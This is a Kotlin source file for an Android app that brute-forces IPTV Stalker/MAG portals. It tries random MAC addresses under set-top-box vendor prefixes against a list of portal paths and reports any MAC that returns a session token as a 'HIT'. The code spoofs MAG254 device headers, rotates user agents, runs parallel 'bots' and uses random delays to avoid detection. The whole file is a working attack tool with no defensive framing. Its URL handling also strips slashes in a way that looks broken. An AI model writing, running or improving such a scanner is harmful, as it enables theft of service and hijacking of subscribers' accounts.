package com.foxymacscan.app.scanner

import kotlinx.coroutines.*
import okhttp3.*
import java.io.IOException
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.random.Random

class MacScanner {
    private var scanJob: Job? = null
    private val client = OkHttpClient.Builder()
        .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
        .build()

    private val macPrefixes = listOf(
        "00:1A:79:", "00:04:0E:", "00:07:BA:", "00:0C:29:", "00:0D:4B:",
        "00:0D:67:", "00:1A:4D:", "00:1A:92:", "00:1B:79:", "00:1C:19:",
        "00:1C:79:", "00:1D:7E:", "00:1E:67:", "00:1F:33:", "00:2A:01:",
        "00:2A:79:", "00:22:55:", "00:23:DF:", "00:24:D4:", "00:25:9C:"
    )

    private val portalTypes = listOf(
        "/portal.php",
        "/server/load.php",
        "/stalker_portal/server/load.php",
        "/stalker_u.php",
        "/BoSSxxxx/portal.php",
        "/c/portal.php",
        "/c/server/load.php",
        "/magaccess/portal.php",
        "/portalcc.php"
    )

    private val userAgents = listOf(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "VU IPTV Player/1.0.0 (Android/10.0)",
        "Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15"
    )

    fun startScan(
        panelUrl: String,
        macPrefix: String,
        botCount: Int,
        onProgress: (Float) -> Unit,
        onResult: (String) -> Unit,
        onComplete: () -> Unit
    ) {
        scanJob = CoroutineScope(Dispatchers.Default).launch {
            try {
                val hits = mutableListOf<String>()
                val totalMacs = 1000  // Configurable
                val isRunning = AtomicBoolean(true)

                // Launch multiple bot coroutines
                val jobs = (1..botCount).map { botId ->
                    async(Dispatchers.IO) {
                        scanWithBot(
                            botId = botId,
                            panelUrl = panelUrl,
                            macPrefix = macPrefix,
                            totalMacs = totalMacs,
                            botCount = botCount,
                            isRunning = isRunning,
                            onProgress = onProgress,
                            onResult = { result ->
                                hits.add(result)
                                onResult(result)
                            }
                        )
                    }
                }

                jobs.awaitAll()
                onComplete()
            } catch (e: Exception) {
                e.printStackTrace()
                onComplete()
            }
        }
    }

    fun stopScan() {
        scanJob?.cancel()
        scanJob = null
    }

    private suspend fun scanWithBot(
        botId: Int,
        panelUrl: String,
        macPrefix: String,
        totalMacs: Int,
        botCount: Int,
        isRunning: AtomicBoolean,
        onProgress: (Float) -> Unit,
        onResult: (String) -> Unit
    ) {
        var processed = botId - 1
        val selectedPortal = portalTypes.random()
        val baseUrl = if (panelUrl.startsWith("http")) panelUrl else "http://$panelUrl"
        val cleanUrl = baseUrl.replace("/c", "").replace("/", "")

        while (processed < totalMacs && isRunning.get()) {
            try {
                val mac = generateMAC(macPrefix)
                val fullUrl = "http://$cleanUrl$selectedPortal?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml"

                val request = Request.Builder()
                    .url(fullUrl)
                    .header("User-Agent", userAgents.random())
                    .header("Cookie", "mac=$mac; stb_lang=en; timezone=Europe/Paris;")
                    .header("X-User-Agent", "Model: MAG254; Link: Ethernet")
                    .build()

                val response = client.newCall(request).execute()
                val responseBody = response.body?.string() ?: ""

                if (response.code == 200 && responseBody.contains("token")) {
                    onResult("✓ HIT: $mac on $cleanUrl")
                }

                response.close()
                processed += botCount
                onProgress(processed.toFloat() / totalMacs)
                delay(Random.nextLong(100, 500))

            } catch (e: IOException) {
                delay(1000)
            } catch (e: Exception) {
                e.printStackTrace()
                delay(500)
            }
        }
    }

    private fun generateMAC(prefix: String): String {
        val random = Random.Default
        val octet1 = String.format("%02X", random.nextInt(256))
        val octet2 = String.format("%02X", random.nextInt(256))
        val octet3 = String.format("%02X", random.nextInt(256))
        return "$prefix$octet1:$octet2:$octet3"
    }
}
